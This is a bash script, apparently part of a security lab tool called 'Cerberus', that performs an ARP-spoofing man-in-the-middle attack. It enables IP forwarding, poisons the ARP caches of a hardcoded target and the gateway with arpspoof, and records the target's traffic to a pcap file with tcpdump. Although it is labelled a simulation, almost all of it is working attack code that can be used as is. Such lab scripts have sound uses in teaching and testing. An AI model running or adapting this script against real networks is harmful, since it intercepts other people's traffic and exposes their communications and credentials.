#!/bin/bash
# Cerberus Attack Module
# Simulates a Man-in-the-Middle (MITM) attack using ARP Spoofing.

TARGET="172.20.0.20"
GATEWAY=$(ip route show | grep default | awk '{print $3}')
INTERFACE=$(ip route show | grep default | awk '{print $5}')
CAPTURE_FILE="/app/reports/capture.pcap"

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

# ---------------- VISUALS ----------------
echo -e "${RED}"
echo "    (  (      (      (      "
echo "    )\ )\     )\     )\     "
echo "   ((_((_)   ((_)   ((_)    "
echo "    _  _      _      _      "
echo "   | \| |    | |    | |     "
echo "   |_ ._|    |_|    |_|     "
echo "     |_|      |      |      "
echo "     WARNING: ATTACK SIMULATION INITIATED  "
echo -e "${NC}"
echo -e "    Target:  $TARGET"
echo -e "    Gateway: $GATEWAY ($INTERFACE)"
echo "----------------------------------------"

# 1. ENABLE KERNEL FORWARDING
# This ensures we don't block the victim's internet connection
echo -e "${CYAN}[*] Step 1: Enabling IP Forwarding...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${CYAN}    -> Forwarding Enabled.${NC}"
else

    echo -e "${YELLOW}    -> Warning: Read-only filesystem. Skipping forwarding.${NC}"
fi

# 2. LAUNCH ARP SPOOF (BACKGROUND)
echo -e "${CYAN}[*] Step 2: Poisoning ARP Cache (10 seconds)...${NC}"

# Spoof Target: "I am the Gateway"
timeout 10s arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" > /dev/null 2>&1 &
PID1=$!

# Spoof Gateway: "I am the Target"
timeout 10s arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" > /dev/null 2>&1 &
PID2=$!

# 3. SNIFF TRAFFIC
echo -e "${CYAN}[*] Step 3: Sniffing Packets to ${YELLOW}$CAPTURE_FILE${NC}"
timeout 10s tcpdump -i "$INTERFACE" host "$TARGET" -w "$CAPTURE_FILE" > /dev/null 2>&1

echo -e "${CYAN}[*] Stopping Attack...${NC}"
kill $PID1 $PID2 2>/dev/null
wait $PID1 $PID2 2>/dev/null

echo "----------------------------------------"
echo -e " ATTACK COMPLETE."
echo -e "   Traffic captured. Analyze with: tcpdump -r reports/capture.pcap"
echo "----------------------------------------"